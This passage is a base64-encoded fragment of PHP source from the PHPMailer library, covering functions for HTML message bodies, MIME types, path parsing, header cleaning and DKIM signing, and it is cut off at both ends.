GtleV07DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICByZXR1cm4gJGtleTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gaXNFcnJvcigpIHsNCiAgICAgICAgcmV0dXJuICgkdGhpcy0+ZXJyb3JfY291bnQgPiAwKTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGZpeEVPTCgkc3RyKSB7DQogICAgICAgICRuc3RyID0gc3RyX3JlcGxhY2UoYXJyYXkoDQogICAgICAgICAgICAiXHJcbiIsDQogICAgICAgICAgICAiXHIiDQogICAgICAgICksICJcbiIsICRzdHIpOw0KICAgICAgICBpZiAoJHRoaXMtPkxFICE9PSAiXG4iKSB7DQogICAgICAgICAgICAkbnN0ciA9IHN0cl9yZXBsYWNlKCJcbiIsICR0aGlzLT5MRSwgJG5zdHIpOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkbnN0cjsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGFkZEN1c3RvbUhlYWRlcigkbmFtZSwgJHZhbHVlID0gbnVsbCkgew0KICAgICAgICBpZiAoJHZhbHVlID09PSBudWxsKSB7DQogICAgICAgICAgICAkdGhpcy0+Q3VzdG9tSGVhZGVyW10gPSBleHBsb2RlKCc6JywgJG5hbWUsIDIpOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJHRoaXMtPkN1c3RvbUhlYWRlcltdID0gYXJyYXkoDQogICAgICAgICAgICAgICAgJG5hbWUsDQogICAgICAgICAgICAgICAgJHZhbHVlDQogICAgICAgICAgICApOw0KICAgICAgICB9DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRDdXN0b21IZWFkZXJzKCkgew0KICAgICAgICByZXR1cm4gJHRoaXMtPkN1c3RvbUhlYWRlcjsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIG1zZ0hUTUwoJG1lc3NhZ2UsICRiYXNlZGlyID0gJycsICRhZHZhbmNlZCA9IGZhbHNlKSB7DQogICAgICAgIHByZWdfbWF0Y2hfYWxsKCcvKHNyY3xiYWNrZ3JvdW5kKT1bIlwnXSguKilbIlwnXS9VaScsICRtZXNzYWdlLCAkaW1hZ2VzKTsNCiAgICAgICAgaWYgKGFycmF5X2tleV9leGlzdHMoMiwgJGltYWdlcykpIHsNCiAgICAgICAgICAgIGlmIChzdHJsZW4oJGJhc2VkaXIpID4gMSAmJiBzdWJzdHIoJGJhc2VkaXIsIC0xKSAhPSAnLycpIHsNCiAgICAgICAgICAgICAgICAkYmFzZWRpciAuPSAnLyc7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBmb3JlYWNoICgkaW1hZ2VzWzJdIGFzICRpbWdpbmRleCA9PiAkdXJsKSB7DQogICAgICAgICAgICAgICAgaWYgKHByZWdfbWF0Y2goJyNeZGF0YTooaW1hZ2VbXjssXSopKDtiYXNlNjQpPywjJywgJHVybCwgJG1hdGNoKSkgew0KICAgICAgICAgICAgICAgICAgICAkZGF0YSA9IHN1YnN0cigkdXJsLCBzdHJwb3MoJHVybCwgJywnKSk7DQogICAgICAgICAgICAgICAgICAgIGlmICgkbWF0Y2hbMl0pIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRkYXRhID0gYmFzZTY0X2RlY29kZSgkZGF0YSk7DQogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkZGF0YSA9IHJhd3VybGRlY29kZSgkZGF0YSk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgJGNpZCA9IG1kNSgkdXJsKSAuICdAcGhwbWFpbGVyLjAnOw0KICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPmFkZFN0cmluZ0VtYmVkZGVkSW1hZ2UoJGRhdGEsICRjaWQsICdlbWJlZCcgLiAkaW1naW5kZXgsICdiYXNlNjQnLCAkbWF0Y2hbMV0pKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkbWVzc2FnZSA9IHN0cl9yZXBsYWNlKCRpbWFnZXNbMF1bJGltZ2luZGV4XSwgJGltYWdlc1sxXVskaW1naW5kZXhdIC4gJz0iY2lkOicgLiAkY2lkIC4gJyInLCAkbWVzc2FnZSk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgY29udGludWU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGlmICghZW1wdHkoJGJhc2VkaXIpICYmIChzdHJwb3MoJHVybCwgJy4uJykgPT09IGZhbHNlKSAmJiBzdWJzdHIoJHVybCwgMCwgNCkgIT09ICdjaWQ6JyAmJiAhcHJlZ19tYXRjaCgnI15bYS16XVthLXowLTkrLi1dKjo/Ly8jaScsICR1cmwpKSB7DQogICAgICAgICAgICAgICAgICAgICRmaWxlbmFtZSAgPSBiYXNlbmFtZSgkdXJsKTsNCiAgICAgICAgICAgICAgICAgICAgJGRpcmVjdG9yeSA9IGRpcm5hbWUoJHVybCk7DQogICAgICAgICAgICAgICAgICAgIGlmICgkZGlyZWN0b3J5ID09ICcuJykgew0KICAgICAgICAgICAgICAgICAgICAgICAgJGRpcmVjdG9yeSA9ICcnOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICRjaWQgPSBtZDUoJHVybCkgLiAnQHBocG1haWxlci4wJzsNCiAgICAgICAgICAgICAgICAgICAgaWYgKHN0cmxlbigkZGlyZWN0b3J5KSA+IDEgJiYgc3Vic3RyKCRkaXJlY3RvcnksIC0xKSAhPSAnLycpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRkaXJlY3RvcnkgLj0gJy8nOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+YWRkRW1iZWRkZWRJbWFnZSgkYmFzZWRpciAuICRkaXJlY3RvcnkgLiAkZmlsZW5hbWUsICRjaWQsICRmaWxlbmFtZSwgJ2Jhc2U2NCcsIHNlbGY6Ol9taW1lX3R5cGVzKChzdHJpbmcpIHNlbGY6Om1iX3BhdGhpbmZvKCRmaWxlbmFtZSwgUEFUSElORk9fRVhURU5TSU9OKSkpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkbWVzc2FnZSA9IHByZWdfcmVwbGFjZSgnLycgLiAkaW1hZ2VzWzFdWyRpbWdpbmRleF0gLiAnPVsiXCddJyAuIHByZWdfcXVvdGUoJHVybCwgJy8nKSAuICdbIlwnXS9VaScsICRpbWFnZXNbMV1bJGltZ2luZGV4XSAuICc9ImNpZDonIC4gJGNpZCAuICciJywgJG1lc3NhZ2UpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgICR0aGlzLT5pc0hUTUwodHJ1ZSk7DQogICAgICAgICR0aGlzLT5Cb2R5ICAgID0gJHRoaXMtPm5vcm1hbGl6ZUJyZWFrcygkbWVzc2FnZSk7DQogICAgICAgICR0aGlzLT5BbHRCb2R5ID0gJHRoaXMtPm5vcm1hbGl6ZUJyZWFrcygkdGhpcy0+aHRtbDJ0ZXh0KCRtZXNzYWdlLCAkYWR2YW5jZWQpKTsNCiAgICAgICAgaWYgKCEkdGhpcy0+YWx0ZXJuYXRpdmVFeGlzdHMoKSkgew0KICAgICAgICAgICAgJHRoaXMtPkFsdEJvZHkgPSAnVG8gdmlldyB0aGlzIGVtYWlsIG1lc3NhZ2UsIG9wZW4gaXQgaW4gYSBwcm9ncmFtIHRoYXQgdW5kZXJzdGFuZHMgSFRNTCEnIC4gc2VsZjo6Q1JMRiAuIHNlbGY6OkNSTEY7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICR0aGlzLT5Cb2R5Ow0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gaHRtbDJ0ZXh0KCRodG1sLCAkYWR2YW5jZWQgPSBmYWxzZSkgew0KICAgICAgICBpZiAoaXNfY2FsbGFibGUoJGFkdmFuY2VkKSkgew0KICAgICAgICAgICAgcmV0dXJuIGNhbGxfdXNlcl9mdW5jKCRhZHZhbmNlZCwgJGh0bWwpOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiBodG1sX2VudGl0eV9kZWNvZGUodHJpbShzdHJpcF90YWdzKHByZWdfcmVwbGFjZSgnLzwoaGVhZHx0aXRsZXxzdHlsZXxzY3JpcHQpW14+XSo+Lio/PFwvXFwxPi9zaScsICcnLCAkaHRtbCkpKSwgRU5UX1FVT1RFUywgJHRoaXMtPkNoYXJTZXQpOw0KICAgIH0NCiAgICBwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIF9taW1lX3R5cGVzKCRleHQgPSAnJykgew0KICAgICAgICAkbWltZXMgPSBhcnJheSgNCiAgICAgICAgICAgICd4bCcgPT4gJ2FwcGxpY2F0aW9uL2V4Y2VsJywNCiAgICAgICAgICAgICdqcycgPT4gJ2FwcGxpY2F0aW9uL2phdmFzY3JpcHQnLA0KICAgICAgICAgICAgJ2hxeCcgPT4gJ2FwcGxpY2F0aW9uL21hYy1iaW5oZXg0MCcsDQogICAgICAgICAgICAnY3B0JyA9PiAnYXBwbGljYXRpb24vbWFjLWNvbXBhY3Rwcm8nLA0KICAgICAgICAgICAgJ2JpbicgPT4gJ2FwcGxpY2F0aW9uL21hY2JpbmFyeScsDQogICAgICAgICAgICAnZG9jJyA9PiAnYXBwbGljYXRpb24vbXN3b3JkJywNCiAgICAgICAgICAgICd3b3JkJyA9PiAnYXBwbGljYXRpb24vbXN3b3JkJywNCiAgICAgICAgICAgICd4bHN4JyA9PiAnYXBwbGljYXRpb24vdm5kLm9wZW54bWxmb3JtYXRzLW9mZmljZWRvY3VtZW50LnNwcmVhZHNoZWV0bWwuc2hlZXQnLA0KICAgICAgICAgICAgJ3hsdHgnID0+ICdhcHBsaWNhdGlvbi92bmQub3BlbnhtbGZvcm1hdHMtb2ZmaWNlZG9jdW1lbnQuc3ByZWFkc2hlZXRtbC50ZW1wbGF0ZScsDQogICAgICAgICAgICAncG90eCcgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5vcGVueG1sZm9ybWF0cy1vZmZpY2Vkb2N1bWVudC5wcmVzZW50YXRpb25tbC50ZW1wbGF0ZScsDQogICAgICAgICAgICAncHBzeCcgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5vcGVueG1sZm9ybWF0cy1vZmZpY2Vkb2N1bWVudC5wcmVzZW50YXRpb25tbC5zbGlkZXNob3cnLA0KICAgICAgICAgICAgJ3BwdHgnID0+ICdhcHBsaWNhdGlvbi92bmQub3BlbnhtbGZvcm1hdHMtb2ZmaWNlZG9jdW1lbnQucHJlc2VudGF0aW9ubWwucHJlc2VudGF0aW9uJywNCiAgICAgICAgICAgICdzbGR4JyA9PiAnYXBwbGljYXRpb24vdm5kLm9wZW54bWxmb3JtYXRzLW9mZmljZWRvY3VtZW50LnByZXNlbnRhdGlvbm1sLnNsaWRlJywNCiAgICAgICAgICAgICdkb2N4JyA9PiAnYXBwbGljYXRpb24vdm5kLm9wZW54bWxmb3JtYXRzLW9mZmljZWRvY3VtZW50LndvcmRwcm9jZXNzaW5nbWwuZG9jdW1lbnQnLA0KICAgICAgICAgICAgJ2RvdHgnID0+ICdhcHBsaWNhdGlvbi92bmQub3BlbnhtbGZvcm1hdHMtb2ZmaWNlZG9jdW1lbnQud29yZHByb2Nlc3NpbmdtbC50ZW1wbGF0ZScsDQogICAgICAgICAgICAneGxhbScgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5tcy1leGNlbC5hZGRpbi5tYWNyb0VuYWJsZWQuMTInLA0KICAgICAgICAgICAgJ3hsc2InID0+ICdhcHBsaWNhdGlvbi92bmQubXMtZXhjZWwuc2hlZXQuYmluYXJ5Lm1hY3JvRW5hYmxlZC4xMicsDQogICAgICAgICAgICAnY2xhc3MnID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLA0KICAgICAgICAgICAgJ2RsbCcgPT4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsDQogICAgICAgICAgICAnZG1zJyA9PiAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJywNCiAgICAgICAgICAgICdleGUnID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLA0KICAgICAgICAgICAgJ2xoYScgPT4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsDQogICAgICAgICAgICAnbHpoJyA9PiAnYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJywNCiAgICAgICAgICAgICdwc2QnID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLA0KICAgICAgICAgICAgJ3NlYScgPT4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScsDQogICAgICAgICAgICAnc28nID0+ICdhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0nLA0KICAgICAgICAgICAgJ29kYScgPT4gJ2FwcGxpY2F0aW9uL29kYScsDQogICAgICAgICAgICAncGRmJyA9PiAnYXBwbGljYXRpb24vcGRmJywNCiAgICAgICAgICAgICdhaScgPT4gJ2FwcGxpY2F0aW9uL3Bvc3RzY3JpcHQnLA0KICAgICAgICAgICAgJ2VwcycgPT4gJ2FwcGxpY2F0aW9uL3Bvc3RzY3JpcHQnLA0KICAgICAgICAgICAgJ3BzJyA9PiAnYXBwbGljYXRpb24vcG9zdHNjcmlwdCcsDQogICAgICAgICAgICAnc21pJyA9PiAnYXBwbGljYXRpb24vc21pbCcsDQogICAgICAgICAgICAnc21pbCcgPT4gJ2FwcGxpY2F0aW9uL3NtaWwnLA0KICAgICAgICAgICAgJ21pZicgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5taWYnLA0KICAgICAgICAgICAgJ3hscycgPT4gJ2FwcGxpY2F0aW9uL3ZuZC5tcy1leGNlbCcsDQogICAgICAgICAgICAncHB0JyA9PiAnYXBwbGljYXRpb24vdm5kLm1zLXBvd2VycG9pbnQnLA0KICAgICAgICAgICAgJ3dieG1sJyA9PiAnYXBwbGljYXRpb24vdm5kLndhcC53YnhtbCcsDQogICAgICAgICAgICAnd21sYycgPT4gJ2FwcGxpY2F0aW9uL3ZuZC53YXAud21sYycsDQogICAgICAgICAgICAnZGNyJyA9PiAnYXBwbGljYXRpb24veC1kaXJlY3RvcicsDQogICAgICAgICAgICAnZGlyJyA9PiAnYXBwbGljYXRpb24veC1kaXJlY3RvcicsDQogICAgICAgICAgICAnZHhyJyA9PiAnYXBwbGljYXRpb24veC1kaXJlY3RvcicsDQogICAgICAgICAgICAnZHZpJyA9PiAnYXBwbGljYXRpb24veC1kdmknLA0KICAgICAgICAgICAgJ2d0YXInID0+ICdhcHBsaWNhdGlvbi94LWd0YXInLA0KICAgICAgICAgICAgJ3BocDMnID0+ICdhcHBsaWNhdGlvbi94LWh0dHBkLXBocCcsDQogICAgICAgICAgICAncGhwNCcgPT4gJ2FwcGxpY2F0aW9uL3gtaHR0cGQtcGhwJywNCiAgICAgICAgICAgICdwaHAnID0+ICdhcHBsaWNhdGlvbi94LWh0dHBkLXBocCcsDQogICAgICAgICAgICAncGh0bWwnID0+ICdhcHBsaWNhdGlvbi94LWh0dHBkLXBocCcsDQogICAgICAgICAgICAncGhwcycgPT4gJ2FwcGxpY2F0aW9uL3gtaHR0cGQtcGhwLXNvdXJjZScsDQogICAgICAgICAgICAnc3dmJyA9PiAnYXBwbGljYXRpb24veC1zaG9ja3dhdmUtZmxhc2gnLA0KICAgICAgICAgICAgJ3NpdCcgPT4gJ2FwcGxpY2F0aW9uL3gtc3R1ZmZpdCcsDQogICAgICAgICAgICAndGFyJyA9PiAnYXBwbGljYXRpb24veC10YXInLA0KICAgICAgICAgICAgJ3RneicgPT4gJ2FwcGxpY2F0aW9uL3gtdGFyJywNCiAgICAgICAgICAgICd4aHQnID0+ICdhcHBsaWNhdGlvbi94aHRtbCt4bWwnLA0KICAgICAgICAgICAgJ3hodG1sJyA9PiAnYXBwbGljYXRpb24veGh0bWwreG1sJywNCiAgICAgICAgICAgICd6aXAnID0+ICdhcHBsaWNhdGlvbi96aXAnLA0KICAgICAgICAgICAgJ21pZCcgPT4gJ2F1ZGlvL21pZGknLA0KICAgICAgICAgICAgJ21pZGknID0+ICdhdWRpby9taWRpJywNCiAgICAgICAgICAgICdtcDInID0+ICdhdWRpby9tcGVnJywNCiAgICAgICAgICAgICdtcDMnID0+ICdhdWRpby9tcGVnJywNCiAgICAgICAgICAgICdtcGdhJyA9PiAnYXVkaW8vbXBlZycsDQogICAgICAgICAgICAnYWlmJyA9PiAnYXVkaW8veC1haWZmJywNCiAgICAgICAgICAgICdhaWZjJyA9PiAnYXVkaW8veC1haWZmJywNCiAgICAgICAgICAgICdhaWZmJyA9PiAnYXVkaW8veC1haWZmJywNCiAgICAgICAgICAgICdyYW0nID0+ICdhdWRpby94LXBuLXJlYWxhdWRpbycsDQogICAgICAgICAgICAncm0nID0+ICdhdWRpby94LXBuLXJlYWxhdWRpbycsDQogICAgICAgICAgICAncnBtJyA9PiAnYXVkaW8veC1wbi1yZWFsYXVkaW8tcGx1Z2luJywNCiAgICAgICAgICAgICdyYScgPT4gJ2F1ZGlvL3gtcmVhbGF1ZGlvJywNCiAgICAgICAgICAgICd3YXYnID0+ICdhdWRpby94LXdhdicsDQogICAgICAgICAgICAnYm1wJyA9PiAnaW1hZ2UvYm1wJywNCiAgICAgICAgICAgICdnaWYnID0+ICdpbWFnZS9naWYnLA0KICAgICAgICAgICAgJ2pwZWcnID0+ICdpbWFnZS9qcGVnJywNCiAgICAgICAgICAgICdqcGUnID0+ICdpbWFnZS9qcGVnJywNCiAgICAgICAgICAgICdqcGcnID0+ICdpbWFnZS9qcGVnJywNCiAgICAgICAgICAgICdwbmcnID0+ICdpbWFnZS9wbmcnLA0KICAgICAgICAgICAgJ3RpZmYnID0+ICdpbWFnZS90aWZmJywNCiAgICAgICAgICAgICd0aWYnID0+ICdpbWFnZS90aWZmJywNCiAgICAgICAgICAgICdlbWwnID0+ICdtZXNzYWdlL3JmYzgyMicsDQogICAgICAgICAgICAnY3NzJyA9PiAndGV4dC9jc3MnLA0KICAgICAgICAgICAgJ2h0bWwnID0+ICd0ZXh0L2h0bWwnLA0KICAgICAgICAgICAgJ2h0bScgPT4gJ3RleHQvaHRtbCcsDQogICAgICAgICAgICAnc2h0bWwnID0+ICd0ZXh0L2h0bWwnLA0KICAgICAgICAgICAgJ2xvZycgPT4gJ3RleHQvcGxhaW4nLA0KICAgICAgICAgICAgJ3RleHQnID0+ICd0ZXh0L3BsYWluJywNCiAgICAgICAgICAgICd0eHQnID0+ICd0ZXh0L3BsYWluJywNCiAgICAgICAgICAgICdydHgnID0+ICd0ZXh0L3JpY2h0ZXh0JywNCiAgICAgICAgICAgICdydGYnID0+ICd0ZXh0L3J0ZicsDQogICAgICAgICAgICAndmNmJyA9PiAndGV4dC92Y2FyZCcsDQogICAgICAgICAgICAndmNhcmQnID0+ICd0ZXh0L3ZjYXJkJywNCiAgICAgICAgICAgICd4bWwnID0+ICd0ZXh0L3htbCcsDQogICAgICAgICAgICAneHNsJyA9PiAndGV4dC94bWwnLA0KICAgICAgICAgICAgJ21wZWcnID0+ICd2aWRlby9tcGVnJywNCiAgICAgICAgICAgICdtcGUnID0+ICd2aWRlby9tcGVnJywNCiAgICAgICAgICAgICdtcGcnID0+ICd2aWRlby9tcGVnJywNCiAgICAgICAgICAgICdtb3YnID0+ICd2aWRlby9xdWlja3RpbWUnLA0KICAgICAgICAgICAgJ3F0JyA9PiAndmlkZW8vcXVpY2t0aW1lJywNCiAgICAgICAgICAgICdydicgPT4gJ3ZpZGVvL3ZuZC5ybi1yZWFsdmlkZW8nLA0KICAgICAgICAgICAgJ2F2aScgPT4gJ3ZpZGVvL3gtbXN2aWRlbycsDQogICAgICAgICAgICAnbW92aWUnID0+ICd2aWRlby94LXNnaS1tb3ZpZScNCiAgICAgICAgKTsNCiAgICAgICAgaWYgKGFycmF5X2tleV9leGlzdHMoc3RydG9sb3dlcigkZXh0KSwgJG1pbWVzKSkgew0KICAgICAgICAgICAgcmV0dXJuICRtaW1lc1tzdHJ0b2xvd2VyKCRleHQpXTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gJ2FwcGxpY2F0aW9uL29jdGV0LXN0cmVhbSc7DQogICAgfQ0KICAgIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gZmlsZW5hbWVUb1R5cGUoJGZpbGVuYW1lKSB7DQogICAgICAgICRxcG9zID0gc3RycG9zKCRmaWxlbmFtZSwgJz8nKTsNCiAgICAgICAgaWYgKGZhbHNlICE9PSAkcXBvcykgew0KICAgICAgICAgICAgJGZpbGVuYW1lID0gc3Vic3RyKCRmaWxlbmFtZSwgMCwgJHFwb3MpOw0KICAgICAgICB9DQogICAgICAgICRwYXRoaW5mbyA9IHNlbGY6Om1iX3BhdGhpbmZvKCRmaWxlbmFtZSk7DQogICAgICAgIHJldHVybiBzZWxmOjpfbWltZV90eXBlcygkcGF0aGluZm9bJ2V4dGVuc2lvbiddKTsNCiAgICB9DQogICAgcHVibGljIHN0YXRpYyBmdW5jdGlvbiBtYl9wYXRoaW5mbygkcGF0aCwgJG9wdGlvbnMgPSBudWxsKSB7DQogICAgICAgICRyZXQgICAgICA9IGFycmF5KA0KICAgICAgICAgICAgJ2Rpcm5hbWUnID0+ICcnLA0KICAgICAgICAgICAgJ2Jhc2VuYW1lJyA9PiAnJywNCiAgICAgICAgICAgICdleHRlbnNpb24nID0+ICcnLA0KICAgICAgICAgICAgJ2ZpbGVuYW1lJyA9PiAnJw0KICAgICAgICApOw0KICAgICAgICAkcGF0aGluZm8gPSBhcnJheSgpOw0KICAgICAgICBpZiAocHJlZ19tYXRjaCgnJV4oLio/KVtcXFxcL10qKChbXi9cXFxcXSo/KShcLihbXlwuXFxcXC9dKz8pfCkpW1xcXFwvXC5dKiQlaW0nLCAkcGF0aCwgJHBhdGhpbmZvKSkgew0KICAgICAgICAgICAgaWYgKGFycmF5X2tleV9leGlzdHMoMSwgJHBhdGhpbmZvKSkgew0KICAgICAgICAgICAgICAgICRyZXRbJ2Rpcm5hbWUnXSA9ICRwYXRoaW5mb1sxXTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmIChhcnJheV9rZXlfZXhpc3RzKDIsICRwYXRoaW5mbykpIHsNCiAgICAgICAgICAgICAgICAkcmV0WydiYXNlbmFtZSddID0gJHBhdGhpbmZvWzJdOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgaWYgKGFycmF5X2tleV9leGlzdHMoNSwgJHBhdGhpbmZvKSkgew0KICAgICAgICAgICAgICAgICRyZXRbJ2V4dGVuc2lvbiddID0gJHBhdGhpbmZvWzVdOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgaWYgKGFycmF5X2tleV9leGlzdHMoMywgJHBhdGhpbmZvKSkgew0KICAgICAgICAgICAgICAgICRyZXRbJ2ZpbGVuYW1lJ10gPSAkcGF0aGluZm9bM107DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgc3dpdGNoICgkb3B0aW9ucykgew0KICAgICAgICAgICAgY2FzZSBQQVRISU5GT19ESVJOQU1FOg0KICAgICAgICAgICAgY2FzZSAnZGlybmFtZSc6DQogICAgICAgICAgICAgICAgcmV0dXJuICRyZXRbJ2Rpcm5hbWUnXTsNCiAgICAgICAgICAgIGNhc2UgUEFUSElORk9fQkFTRU5BTUU6DQogICAgICAgICAgICBjYXNlICdiYXNlbmFtZSc6DQogICAgICAgICAgICAgICAgcmV0dXJuICRyZXRbJ2Jhc2VuYW1lJ107DQogICAgICAgICAgICBjYXNlIFBBVEhJTkZPX0VYVEVOU0lPTjoNCiAgICAgICAgICAgIGNhc2UgJ2V4dGVuc2lvbic6DQogICAgICAgICAgICAgICAgcmV0dXJuICRyZXRbJ2V4dGVuc2lvbiddOw0KICAgICAgICAgICAgY2FzZSBQQVRISU5GT19GSUxFTkFNRToNCiAgICAgICAgICAgIGNhc2UgJ2ZpbGVuYW1lJzoNCiAgICAgICAgICAgICAgICByZXR1cm4gJHJldFsnZmlsZW5hbWUnXTsNCiAgICAgICAgICAgIGRlZmF1bHQ6DQogICAgICAgICAgICAgICAgcmV0dXJuICRyZXQ7DQogICAgICAgIH0NCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIHNldCgkbmFtZSwgJHZhbHVlID0gJycpIHsNCiAgICAgICAgaWYgKHByb3BlcnR5X2V4aXN0cygkdGhpcywgJG5hbWUpKSB7DQogICAgICAgICAgICAkdGhpcy0+JG5hbWUgPSAkdmFsdWU7DQogICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkdGhpcy0+bGFuZygndmFyaWFibGVfc2V0JykgLiAkbmFtZSk7DQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIHNlY3VyZUhlYWRlcigkc3RyKSB7DQogICAgICAgIHJldHVybiB0cmltKHN0cl9yZXBsYWNlKGFycmF5KA0KICAgICAgICAgICAgIlxyIiwNCiAgICAgICAgICAgICJcbiINCiAgICAgICAgKSwgJycsICRzdHIpKTsNCiAgICB9DQogICAgcHVibGljIHN0YXRpYyBmdW5jdGlvbiBub3JtYWxpemVCcmVha3MoJHRleHQsICRicmVha3R5cGUgPSAiXHJcbiIpIHsNCiAgICAgICAgcmV0dXJuIHByZWdfcmVwbGFjZSgnLyhcclxufFxyfFxuKS9tcycsICRicmVha3R5cGUsICR0ZXh0KTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIHNpZ24oJGNlcnRfZmlsZW5hbWUsICRrZXlfZmlsZW5hbWUsICRrZXlfcGFzcywgJGV4dHJhY2VydHNfZmlsZW5hbWUgPSAnJykgew0KICAgICAgICAkdGhpcy0+c2lnbl9jZXJ0X2ZpbGUgICAgICAgPSAkY2VydF9maWxlbmFtZTsNCiAgICAgICAgJHRoaXMtPnNpZ25fa2V5X2ZpbGUgICAgICAgID0gJGtleV9maWxlbmFtZTsNCiAgICAgICAgJHRoaXMtPnNpZ25fa2V5X3Bhc3MgICAgICAgID0gJGtleV9wYXNzOw0KICAgICAgICAkdGhpcy0+c2lnbl9leHRyYWNlcnRzX2ZpbGUgPSAkZXh0cmFjZXJ0c19maWxlbmFtZTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIERLSU1fUVAoJHR4dCkgew0KICAgICAgICAkbGluZSA9ICcnOw0KICAgICAgICBmb3IgKCRpID0gMDsgJGkgPCBzdHJsZW4oJHR4dCk7ICRpKyspIHsNCiAgICAgICAgICAgICRvcmQgPSBvcmQoJHR4dFskaV0pOw0KICAgICAgICAgICAgaWYgKCgoMHgyMSA8PSAkb3JkKSAmJiAoJG9yZCA8PSAweDNBKSkgfHwgJG9yZCA9PSAweDNDIHx8ICgoMHgzRSA8PSAkb3JkKSAmJiAoJG9yZCA8PSAweDdFKSkpIHsNCiAgICAgICAgICAgICAgICAkbGluZSAuPSAkdHh0WyRpXTsNCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgJGxpbmUgLj0gJz0nIC4gc3ByaW50ZignJTAyWCcsICRvcmQpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkbGluZTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIERLSU1fU2lnbigkc2lnbkhlYWRlcikgew0KICAgICAgICBpZiAoIWRlZmluZWQoJ1BLQ1M3X1RFWFQnKSkgew0KICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7DQogICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZXh0ZW5zaW9uX21pc3NpbmcnKSAuICdvcGVuc3NsJyk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICByZXR1cm4gJyc7DQogICAgICAgIH0NCiAgICAgICAgJHByaXZLZXlTdHIgPSAhZW1wdHkoJHRoaXMtPkRLSU1fcHJpdmF0ZV9zdHJpbmcpID8gJHRoaXMtPkRLSU1fcHJpdmF0ZV9zdHJpbmcgOiBAZmlsZV9nZXRfY29udGVudHMoJHRoaXMtPkRLSU1fcHJpdmF0ZSk7DQogICAgICAgIGlmICgnJyAhPSAkdGhpcy0+REtJTV9wYXNzcGhyYXNlKSB7DQogICAgICAgICAgICAkcHJpdktleSA9IG9wZW5zc2xfcGtleV9nZXRfcHJpdmF0ZSgkcHJpdktleVN0ciwgJHRoaXMtPkRLSU1fcGFzc3BocmFzZSk7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkcHJpdktleSA9IG9wZW5zc2xfcGtleV9nZXRfcHJpdmF0ZSgkcHJpdktleVN0cik7DQogICAgICAgIH0NCiAgICAgICAgaWYgKHZlcnNpb25fY29tcGFyZShQSFBfVkVSU0lPTiwgJzUuMy4wJykgPj0gMCBhbmQgaW5fYXJyYXkoJ3NoYTI1NldpdGhSU0FFbmNyeXB0aW9uJywgb3BlbnNzbF9nZXRfbWRfbWV0aG9kcyh0cnVlKSkpIHsNCiAgICAgICAgICAgIGlmIChvcGVuc3NsX3NpZ24oJHNpZ25IZWFkZXIsICRzaWduYXR1cmUsICRwcml2S2V5LCAnc2hhMjU2V2l0aFJTQUVuY3J5cHRpb24nKSkgew0KI